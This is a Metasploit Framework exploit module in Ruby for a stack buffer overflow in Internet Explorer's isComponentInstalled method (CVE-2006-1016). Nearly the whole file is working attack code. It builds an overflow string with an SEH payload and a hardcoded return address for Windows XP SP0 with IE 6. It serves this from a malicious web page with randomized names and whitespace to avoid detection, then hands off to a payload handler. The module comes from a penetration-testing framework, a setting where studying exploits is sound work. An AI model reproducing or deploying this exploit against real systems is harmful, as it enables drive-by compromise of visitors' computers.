##
# $Id: ie_iscomponentinstalled.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Seh
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer isComponentInstalled Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Internet Explorer. This bug was
				patched in Windows 2000 SP4 and Windows XP SP1 according to MSRC.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'hdm',
				],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2006-1016' ],
					[ 'OSVDB', '31647' ],
					[ 'BID', '16870' ],
				],
			'Payload'        =>
				{
					'Space'          => 512,
					'BadChars'       => "\x00\x5c\x0a\x0d\x22",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows XP SP0 with Internet Explorer 6.0', { 'Ret' =>  0x71ab8e4a } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 24 2006'))
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Create the overflow string
		pattern = rand_text_alpha(8192)

		# Smash the return address with a bogus pointer
		pattern[744, 4] = [0xffffffff].pack('V')

		# Handle the exception :-)
		seh = generate_seh_payload(target.ret)
		pattern[6439, seh.length] = seh


		# Build out the HTML response page
		var_client = rand_text_alpha(rand(30)+2)
		var_html   = rand_text_alpha(rand(30)+2)

		content = %Q|
<html>
<head>
	<script>
		function window.onload() {
			#{var_client}.style.behavior = "url(#default#clientCaps)";
			#{var_client}.isComponentInstalled( "__pattern__" ,  "componentid" );
		}
	</script>
</head>
<body id="#{var_client}">
#{var_html}
</body>
</html>
		|

		content = Rex::Text.randomize_space(content)

		# Insert the shellcode
		content.gsub!('__pattern__', pattern)

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
